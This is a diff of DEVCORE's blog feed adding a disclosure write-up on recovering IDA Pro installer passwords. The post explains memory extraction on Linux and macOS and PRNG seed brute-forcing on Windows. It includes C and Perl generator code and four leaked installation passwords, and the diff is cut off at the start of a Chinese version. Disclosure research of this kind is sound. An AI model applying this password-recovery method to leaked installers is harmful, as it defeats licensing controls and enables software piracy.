@@ -4,13 +4,294 @@
  <title>DEVCORE 戴夫寇爾</title>
  <link href="https://devco.re/" rel="self"/>
  <link href="https://devco.re"/>
- <updated>2019-02-19T19:29:42+08:00</updated>
+ <updated>2019-06-21T21:56:08+08:00</updated>
  <id>https://devco.re</id>
  <author>
    <name>DEVCORE</name>
    <email>contact [at] devco.re</email>
  </author>
 
+ 
+ <entry>
+   <title>Operation Crack: Hacking IDA Pro Installer PRNG from an Unusual Way</title>
+   <link href="https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way-en/"/>
+   <updated>2019-06-21T00:00:00+08:00</updated>
+   <id>https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way-en</id>
+   <content type="html">&lt;p&gt;&lt;a href=&quot;/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way-en/&quot;&gt;English Version&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
+
+&lt;p&gt;Today, we are going to talk about the installation password of Hex-Rays IDA Pro, which is the most famous decompiler. What is installation password? Generally, customers receive a custom installer and installation password after they purchase IDA Pro. The installation password is required during installation process. However, if someday we find a leaked IDA Pro installer, is it still possible to install without an installation password? This is an interesting topic.&lt;/p&gt;
+
+&lt;p&gt;After brainstorming with our team members, we verified the answer: Yes! With a Linux or MacOS version installer, we can easily find the password directly. With a Windows version installer, we only need 10 minutes to calculate the password. The following is the detailed process:&lt;/p&gt;
+
+&lt;h3 id=&quot;-linux-and-macos-version&quot;&gt;* Linux and MacOS version&lt;/h3&gt;
+
+&lt;p&gt;The first challenge is Linux and MacOS version. The installer is built with an installer creation tool called InstallBuilder. We found the plaintext installation password directly in the program memory of the running IDA Pro installer. Mission complete!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190621/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This problem is fixed after we reported through Hex-Rays. &lt;a href=&quot;https://blog.bitrock.com/2019/02/installbuilder-1920-released.html&quot;&gt;BitRock&lt;/a&gt; released InstallBuilder 19.2.0 with the protection of installation password on 2019/02/11.&lt;/p&gt;
+
+&lt;h3 id=&quot;-windows-version&quot;&gt;* Windows version&lt;/h3&gt;
+
+&lt;p&gt;It gets harder on Windows version because the installer is built with &lt;a href=&quot;http://www.jrsoftware.org/isinfo.php&quot;&gt;Inno Setup&lt;/a&gt;, which store its password with &lt;a href=&quot;http://www.jrsoftware.org/ishelp/index.php?topic=setup_password&quot;&gt;160-bit SHA-1 hash&lt;/a&gt;. Therefore, we cannot get the password simply with static or dynamic analyzing the installer, and brute force is apparently not an effective way. But the situation is different if we can grasp the methodology of password generation, which lets us enumerate the password more effectively!&lt;/p&gt;
+
+&lt;p&gt;Although we have realized we need to find how Hex-Rays generate password, it is still really difficult, as we do not know what language the random number generator is implemented with. There are at least &lt;a href=&quot;https://rosettacode.org/wiki/Random_number_generator_(included)&quot;&gt;88 random number generators&lt;/a&gt; known. It is such a great variation.&lt;/p&gt;
+
+&lt;p&gt;We first tried to find the charset used by random number generator. We collected all leaked installation passwords, such as hacking team’s password, which is leaked by WikiLeaks.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;FgVQyXZY2XFk (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/62729&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
+  &lt;li&gt;7ChFzSbF4aik (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/311769&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
+  &lt;li&gt;ZFdLqEM2QMVe (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/62956&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
+  &lt;li&gt;6VYGSyLguBfi (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/70250&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;From the collected passwords we can summarize the charset:&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;The missing of &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;I&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;l&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;O&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;o&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;N&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;n&lt;/code&gt; seems to make sense because they are confusing characters.&lt;br /&gt;
+Next, we guess the possible charset ordering like these:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz
+ABCDEFGHJKLMPQRSTUVWXYZ23456789abcdefghijkmpqrstuvwxyz
+23456789abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ
+abcdefghijkmpqrstuvwxyz23456789ABCDEFGHJKLMPQRSTUVWXYZ
+abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789
+ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz23456789
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Lastly, we picked some common languages（c/php/python/perl）to implement a random number generator and enumerate all the combinations. Then we examined whether the collected passwords appears in the combinations. For example, here is a generator written in C language:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&amp;lt;stdio.h&amp;gt;
+#include&amp;lt;stdlib.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ABCDEFGHJKLMPQRSTUVWXYZ23456789abcdefghijkmpqrstuvwxyz&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;23456789abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;abcdefghijkmpqrstuvwxyz23456789ABCDEFGHJKLMPQRSTUVWXYZ&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz23456789&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+
+        &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;srand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+                &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+                        &lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+                        &lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+                        &lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+                        &lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+                        &lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+                        &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After a month, we finally generated the IDA Pro installation passwords successfully with Perl, and the correct charset ordering is &lt;code class=&quot;highlighter-rouge&quot;&gt;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&lt;/code&gt;. For example, we can generate the hacking team’s leaked password &lt;code class=&quot;highlighter-rouge&quot;&gt;FgVQyXZY2XFk&lt;/code&gt; with the following script:&lt;/p&gt;
+
+&lt;div class=&quot;language-perl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env perl&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;@_e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;split&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3326487116&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;srand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rand&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;$i $pw\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;With this, we can build a dictionary of installation password, which effectively increase the efficiency of brute force attack. Generally, we can compute the password of one installer in 10 minutes.&lt;/p&gt;
+
+&lt;p&gt;We have reported this issue to Hex-Rays, and they promised to harden the installation password immediately.&lt;/p&gt;
+
+&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
+
+&lt;p&gt;In this article, we discussed the possibility of installing IDA Pro without owning installation password. In the end, we found plaintext password in the program memory of Linux and MacOS version. On the other hand, we determined the password generation methodology of Windows version. Therefore, we can build a dictionary to accelerate brute force attack. Finally, we can get one password at a reasonable time.&lt;/p&gt;
+
+&lt;p&gt;We really enjoy this process: surmise wisely and prove it with our best. It can broaden our experience no matter the result is correct or not. This is why we took a whole month to verify such a difficult surmise. We also take this attitude in our &lt;a href=&quot;https://devco.re/en/services/red-team&quot;&gt;Red Team Assessment&lt;/a&gt;. You would love to give it a try!&lt;/p&gt;
+
+&lt;p&gt;Lastly, we would like to thank for the friendly and rapid response from Hex-Rays. Although this issue is not included in &lt;a href=&quot;https://www.hex-rays.com/bugbounty.shtml&quot;&gt;Security Bug Bounty Program&lt;/a&gt;, they still generously awarded us IDA Pro Linux and MAC version, and upgraded the Windows version for us. We really appreciate it.&lt;/p&gt;
+
+&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Jan 31, 2019 - Report to Hex-Rays&lt;/li&gt;
+  &lt;li&gt;Feb 01, 2019 - Hex-Rays promised to harden the installation password and reported to BitRock&lt;/li&gt;
+  &lt;li&gt;Feb 11, 2019 - BitRock released InstallBuilder 19.2.0&lt;/li&gt;
+&lt;/ul&gt;
+
+</content>
+ </entry>
+ 
+ <entry>
+   <title>破密行動: 以不尋常的角度破解 IDA Pro 偽隨機數</title>
+   <link href="https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way/"/>
+   <updated>2019-06-21T00:00:00+08:00</updated>
+   <id>https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way</id>
+   <content type="html">&lt;p&gt;&lt;a href=&quot;/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way-en/&quot;&gt;English Version&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;
+
